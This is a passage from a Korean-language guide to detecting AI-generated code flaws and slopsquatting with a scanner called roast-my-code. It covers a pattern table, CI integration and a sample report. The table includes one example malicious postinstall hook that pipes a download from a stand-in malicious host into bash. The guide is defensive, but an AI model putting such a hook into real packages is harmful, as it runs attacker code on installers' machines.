...
## 7. AI Slopsquatting 탐지 도구와 패턴 분석
### 7.1 탐지 도구 개요
2025년 말, 개발자는 **`roast‑my‑code`** 라는 CLI 기반 도구를 공개했습니다. 이 도구는 AI 코드 생성 어시스턴트가 남기는 **AI Slop**(즉, 비효율·비정상적인 코드 패턴)과 **Slopsquatting** 관련 흔적을 자동으로 식별합니다. 도구는 세 가지 카테고리(AI Slop, Code Quality, Style)로 점수를 부여하며, AI Slop이 전체 점수의 **50 %**를 차지합니다.

- **주요 기능**
  - TODO/FIXME/HACK 주석 탐지
  - 자리 표시자 변수명(예: `foo`, `temp`, `data2`) 식별
  - 흔히 AI가 만들어내는 **허위 import**(예: `magiclib`, `utils2`) 감지
  - `postinstall`·`preinstall` 스크립트에 포함된 외부 URL 호출 탐지
  - 빈 `except` 블록, 전체 주석 처리된 코드 블록 등 비정상적인 구조 탐지

### 7.2 발견된 Slopsquatting 패턴
| 패턴 | 설명 | 예시 |
|------|------|------|
| **TODO/FIXME/HACK 주석** | 리뷰 단계에서 남겨진 미완성 코드 표시 | `# TODO: replace with real implementation` |
| **자리 표시자 변수** | 의미 없는 변수명 사용 | `foo = 0`, `temp = []`, `data2 = None` |
| **허위 import** | 실제 존재하지 않는 패키지를 import | `import magiclib` |
| **빈 except** | 예외를 잡고 아무 동작도 하지 않음 | `except Exception: pass` |
| **전체 주석 블록** | 코드 전체가 주석 처리돼 실행되지 않음 | `""" ... """` |
| **다중 역할 함수** | 하나의 함수가 서로 다른 작업을 수행 | `def handle_it(): ...` (파일 입출력, 네트워크 호출, DB 저장) |
| **악성 postinstall** | 설치 시 외부 스크립트 다운로드 | `"postinstall": "curl https://malicious.example.com | bash"` |
...
2. **프로젝트 루트에서 실행**  
   ```bash
   roast-my-code scan ./src
   ```
   - `--json` 옵션으로 JSON 형식 결과 출력  
   - `--threshold 0.7` 옵션으로 높은 심각도만 표시 가능  

3. **CI/CD 연동 예시 (GitHub Actions)**
   ```yaml
   name: Slopsquatting Scan
     ...
     scan:
       ...
       steps:
         ...
         - name: Install scanner
           run: pip install roast-my-code
         - name: Run scan
           run: roast-my-code scan . --threshold 0.6 --json > slop-report.json
         - name: Upload report
  ...
  "issues": [
    {
      ...
      "line": 23,
      "type": "TODO_COMMENT",
      "message": "Found TODO comment: '# TODO: refactor this function'"
    },
    {
      "file": "main.py",
      "line": 5,
      "type": "FAKE_IMPORT",
      "message": "Import of non‑existent package 'magiclib'"
    },
    {
      "file": "setup.py",
      "line": 12,
      "type": "POSTINSTALL_URL",
      "message": "postinstall script downloads from external URL"
    }
  ]
}
```
위와 같은 결과가 CI 로그에 표시되면, 해당 파일을 검토하고 필요 시 패키지를 차단하거나 코드를 수정합니다.

### 7.5 베스트 프랙티스
- **정기 스캔**: 매 PR마다 `roast‑my‑code`를 실행해 AI Slop이 누적되지 않도록 함.  
- **패턴 커스터마이징**: `~/.roastmycode/config.yaml`에 조직 고유의 금지 변수명·패키지 리스트를 추가.  
- **알림 연동**: 스캔 결과를 Slack, Teams 등에 자동 전송해 빠른 대응을 가능하게 함.  
- **CI 차단**: 심각도 임계값을 초과하면 CI를 실패하도록 설정, 배포 전 차단.  
- **교육**: 개발자에게 “AI Slop” 개념을 교육하고, LLM 프롬프트에 검증 절차를 포함하도록 권고.
...
- CI/CD 파이프라인 전체 실행 로그 보관 (7일 이상).  
- 시스템 파일 해시(SHA256)와 변경 시점 기록.

---

## 9. 권고사항 및 베스트 프랙티스 체크리스트
- **개발 단계**  
